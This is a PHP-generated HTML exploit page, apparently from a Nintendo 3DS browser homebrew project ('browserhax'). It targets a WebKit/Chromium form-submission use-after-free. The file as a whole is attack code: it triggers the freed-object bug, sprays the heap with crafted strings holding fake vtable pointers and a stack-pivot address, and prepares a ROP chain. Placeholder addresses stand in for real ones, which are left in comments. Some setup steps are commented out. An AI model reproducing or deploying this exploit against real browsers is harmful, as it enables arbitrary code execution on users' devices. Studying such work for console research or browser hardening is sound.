<?php

/*
https://chromium.googlesource.com/experimental/chromium/blink/+/refs/heads/master/LayoutTests/fast/forms/form-submission-crash-successful-submit-button.html
https://bugs.chromium.org/p/chromium/issues/detail?id=303657
https://src.chromium.org/viewvc/blink?view=revision&revision=159590
*/

$browserver = 7;

include_once("/home/yellows8/browserhax/browserhax_cfg.php");

include_once("3dsbrowserhax_common.php");

if(($browserver & 0x80) == 0)
{
	//if($browserver == 7)
	{
		$VTABLEPTR = 0x99887744;//0x0964f018;
		$STACKPTR_ADR = 0x22334488;//0x09670024;
		$OBJDATAPAYLOAD_ADDR = 0x11223344;//0x091cb000;
	}
	/*else
	{
		echo "This browser version is not supported.\n";
		exit;
	}*/
}
else
{
	echo "This browser is not supported.\n";
	exit;
}

$ROPHEAP = $VTABLEPTR;

$OBJECTDATA_OVERWRITE = "\"";

for($i=0; $i<0x40; $i+=4)
{
	if($i!=0x4)
	{
		$OBJECTDATA_OVERWRITE.= genu32_unicode(0x40506090);
	}
	else
	{
		$OBJECTDATA_OVERWRITE.= genu32_unicode(0x10203040);
	}
}

$OBJECTDATA_OVERWRITE .= "\"";

$OBJDATAPAYLOAD = "\"";
for($j=0; $j<0x8000; $j+=0x40)
{
	for($i=0; $i<0x40; $i+=4)
	{
		if($i==0x34)
		{
			$OBJDATAPAYLOAD.= genu32_unicode($OBJDATAPAYLOAD_ADDR+4);//Addr of the object used when doing the vtable funcptr call with vtable +0x5c.
		}
		else if($i<0x34 && $i!=0x0)
		{
			$OBJDATAPAYLOAD.= genu32_unicode($VTABLEPTR);
		}
		else if($i==0x38)//Object +0x34 with the above used with stack-pivot(sp).
		{
			$OBJDATAPAYLOAD.= genu32_unicode($STACKPTR_ADR);
		}
		else
		{
			$OBJDATAPAYLOAD.= genu32_unicode($POPPC);
		}
	}
}
$OBJDATAPAYLOAD .= "\"";

generate_ropchain();

?>
<!DOCTYPE html>
<body>
<script>
var form1;
var submit1;

obj = new Array();
objdatapayload = new Array();

function spray()
{
	for(i=0; i<1200; i++)
	{
		obj[i] = unescape(<?= $OBJECTDATA_OVERWRITE ?>);
	}
}

function spray_free()
{
	for(i=0; i<1200; i++)
	{
		obj[i] = null;
	}
}

function setup_objdatapayload()
{
	for(i=0; i<300; i++)
	{
		objdatapayload[i] = unescape(<?= $OBJDATAPAYLOAD ?>);
	}
}

function ropsetup()//This function was originally based on heap() from: http://www.exploit-db.com/exploits/16974/
{
	var stackpivot = unescape(<?= $STACKPIVOT ?>);
	var ropchainstart = unescape(<?= $NOPSLEDROP ?>);
	var ropchain = unescape(<?= $ROPCHAIN ?>);

	do
	{
		stackpivot += stackpivot;
		ropchainstart += ropchainstart;
	} while (stackpivot.length<0x10000);

	ropchainstart += ropchain;

        target = new Array();
	target2 = new Array();
        for(i = 0; i < 10; i++){
            if (i<5) {
		target[i] = stackpivot;
		target2[i] = target[i].substring(0);
		} else if (i>5) {
			target[i] = ropchainstart;
			target2[i] = target[i].substring(0);
		}
        }
}

function gc()
{
    if (window.GCController)
        return GCController.collect();

    for (var i = 0; i < 10000; i++) { // > force garbage collection (FF requires about 9K allocations before a collect)
        var s = new String("abc");
    }
}

function start() {
    form1 = document.createElement('form');
    submit1 = document.createElement('input');
    submit2 = document.createElement('input');
    submit1.type = 'submit';
    submit2.type = 'image';
    form1.addEventListener('submit', handleSubmit, false);
    form1.action = 'javascript:removeImage()';
    form1.appendChild(submit1);
    form1.appendChild(submit2);
    submit1.click();
}
function handleSubmit() {
    form1.removeChild(submit1);
}
function removeImage() {
    form1.removeChild(submit2);
    submit2 = null;
    spray();
    //setup_objdatapayload();
    //ropsetup();
    //spray_free();
    //gc();
}
window.onload = start;
</script>
</body>
